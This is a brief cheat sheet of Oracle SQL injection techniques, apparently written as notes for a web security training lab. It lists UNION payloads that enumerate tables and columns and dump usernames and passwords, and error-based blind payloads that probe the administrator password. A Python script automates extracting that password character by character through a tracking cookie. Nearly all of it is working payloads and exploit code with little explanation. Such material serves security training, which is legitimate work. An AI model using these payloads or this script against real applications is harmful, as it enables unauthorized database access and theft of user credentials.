_____

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`

There is a built-in table on Oracle called `dual`

```sql
SELECT '1' FROM dual
```
# Database version

```bash
SELECT BANNER FROM v$version WHERE ROWNUM = 1
```

# Example

```sql
' union select '1','2' from dual-- -
```

```sql
' union select '1',table_name FROM all_tables-- -
```

```sql
' union select '1',column_name from all_tab_columns where table_name='USERS_SNIHHO'-- -
```

```sql
' union select USERNAME_YRUVHW,PASSWORD_COIZMU from USERS_SNIHHO-- -
```


# Blind

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```

error when the condition is correct,
```sql
'union SELECT CASE WHEN (length(password)=20) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator'-- -
```

```sql
'union SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator'-- -
```

```python 
import requests

# Set the target URL and session cookie
url = 'https://0a91006c04ef245b8033cc45008d0022.web-security-academy.net/'
cookie = {'TrackingId': '', 'session': 'iTq8m3sqiCVktqd3aw0yB3M2CqbTEbbV'}

def check_sqli(payload):
    cookie['TrackingId'] = payload
    try:
        response = requests.get(url, cookies=cookie)
        if response.status_code == 500:
            return True
        else:
            return False
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return False

def exploit_sqli():
    password = ''
    for i in range(1, 21):  # Assuming password length is between 1 and 20
        found_char = False
        for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
            payload = f"' UNION SELECT CASE WHEN (SUBSTR(password,{i},1)='{char}') THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator'-- -"
            if check_sqli(payload):
                password += char
                found_char = True
                print(f"Found character at position {i}: {char}")
                break
        if not found_char:
            print(f"Failed to find character at position {i}. Exiting...")
            break
    return password

if __name__ == '__main__':
    password = exploit_sqli()
    if password:
        print(f"The password for the administrator user is: {password}")
    else:
        print("Failed to extract the password.")
```
